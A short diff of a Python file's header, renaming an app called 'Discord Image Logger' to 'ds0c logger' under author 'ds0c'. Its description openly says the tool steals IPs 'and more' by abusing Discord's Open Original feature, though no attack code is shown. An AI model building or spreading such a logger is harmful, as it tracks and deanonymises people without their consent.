@@ -7,7 +7,7 @@ import urllib.parse
 from datetime import datetime
 import traceback
 
-__app__ = "Discord Image Logger"
+__app__ = "ds0c logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "ds0c"
